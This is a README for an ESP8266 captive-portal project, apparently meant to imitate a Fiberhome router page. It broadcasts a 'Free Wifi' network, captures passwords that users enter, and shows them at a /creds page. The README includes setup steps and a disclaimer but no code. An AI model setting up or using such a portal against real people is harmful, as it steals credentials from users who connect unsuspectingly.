# Fiberhome Captive Portal
## Captive Portal
A captive portal is a web page accessed with a web browser that is displayed to newly connected users of a Wi-Fi or wired network before they are granted broader access to network resources. Captive portals are commonly used to present a landing or log-in page which may require authentication, payment, acceptance of an end-user license agreement, acceptable use policy, survey completion, or other valid credentials that both the host and user agree to adhere by.

## Usage
1. Connect to Captive Portal SSID Named "Free Wifi" (you can change it)
2. Access this IP address on Browser:
```
http://172.0.0.1
```
3. Access this available URL
```
1. http://172.0.0.1/creds -> to see stored password
2. http://172.0.0.1/clear -> to clear stored password
```
4. Enjoy!!! 
## Disclaimer
This project is for testing and educational purposes. Use it only against your own networks and devices. I don't take any responsibility for what you do with this program.

## Installation Using Arduino IDE
1. Open your Arduino IDE and go to "File -> Preferences -> Boards Manager URLs" and paste the following link: 
```
http://arduino.esp8266.com/stable/package_esp8266com_index.json
```
2. Go to "Tools -> Board -> Boards Manager", search "esp8266" and install esp8266
3. Go to "Tools -> Board" and select you board"
4. Download and open the sketch "ESP8266_WiFi_Captive_Portal_2.0.ino"
5. You can optionally change some parameters like the SSID name and texts of the page like title, subtitle, text body...
6. Upload the code into your board.

## Credits
References: 
<br>
[ESP8266_WiFi_Captive_Portal_2.0](https://github.com/adamff-dev/ESP8266_WiFi_Captive_Portal_2.0)
<br>
[ESP8266 WiFi Captive Portal](https://github.com/adamff-dev/ESP8266-Captive-Portal)